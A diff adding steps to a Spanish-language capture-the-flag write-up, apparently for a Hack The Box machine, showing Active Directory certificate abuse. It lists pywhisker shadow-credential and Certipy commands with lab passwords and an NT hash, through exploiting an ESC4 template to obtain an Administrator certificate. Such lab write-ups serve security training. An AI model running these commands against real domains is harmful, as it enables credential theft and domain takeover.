@@ -305,7 +305,32 @@ Añadimos las shadow credentials a `ca_svc`
 pywhisker -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --target ca_svc --action add
 ```
 
+Obtenemos el hash con la informacion obtenida
+```shell
+certipy auth -pfx zX5kmYs5.pfx -password u35mJEVwQSjQTFnmBNSl -username ca_svc -domain sequel.htb -dc-ip 10.129.232.128
+```
 
+```c++
+[*] Got hash for 'ca_svc@sequel.htb': aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce
+```
+
+
+Vemos si tiene alguna vulnerabilidad
+```shell
+certipy find -u 'ca_svc@sequel.htb' -hashes aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -vulnerable -stdout
+```
+
+```C++
+[!] Vulnerabilities ESC4: User has dangerous permissions.
+```
+
+### Abusing ESC4
+Usamos la versión de Certipy 5.0.4
+```shell
+certipy template -dc-ip 10.129.232.128 -u ca_svc -hashes aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -target sequel.htb -write-default-configuration
+```
+
+Obtenmos el certificado del usuario `Administrador` y nos lo traemos a nuestra maquina
 
 
 Verificamos que se haya realizado el cambio de contraseña
